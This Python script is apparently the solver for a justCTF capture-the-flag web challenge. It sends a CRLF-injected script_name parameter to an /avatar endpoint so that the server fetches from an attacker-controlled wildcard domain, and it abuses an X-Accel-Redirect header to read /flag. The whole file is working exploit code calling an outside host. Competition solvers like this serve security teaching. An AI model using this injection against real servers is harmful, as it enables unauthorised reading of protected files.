import argparse
import requests


def exploit_healthcheck(exploit_server):
    exploit_healthcheck_address = f'http://justcattheimages.s3.eu-central-1.amazonaws.com{exploit_server}/%0d%0a%250d%250ahttps://justcattheimages.s3.eu-central-1.amazonaws.com/img/basement.jpg'
    resp = requests.get(exploit_healthcheck_address)
    try:
        accel = resp.headers['X-Accel-Redirect']
        assert accel == '/flag'
    except (AssertionError, KeyError):
        print('The exploit server seems to be down')


def main():
    parser = argparse.ArgumentParser(
        description='A simple Python script.', add_help=False)
    parser.add_argument('-h', '--host', type=str,
                        help='Task host', required=True)
    parser.add_argument('-p', '--port', type=str,
                        help='Port number', required=True)
    parser.add_argument('-e', '--exploit', type=str,
                        help='The address of the exploit server which returns any response with `X-Accel-Redirect: /flag` header to a request to a wildcard domain', required=False, default='.72f3427fcc6f7ef15c5beee70ea02607.bountyexplained.com')
    args = parser.parse_args()
    exploit_healthcheck(args.exploit)
    protocol = 'https' if args.port == 443 else 'http'
    url = f'{protocol}://{args.host}:{args.port}/avatar?image=center.jpg&script_name={args.exploit}/%0d%0a%250d%250ahttps://justcattheimages.s3.eu-central-1.amazonaws.com'
    resp = requests.get(url)
    print(resp.text)
    assert 'justCTF{' in resp.text


if __name__ == "__main__":
    main()
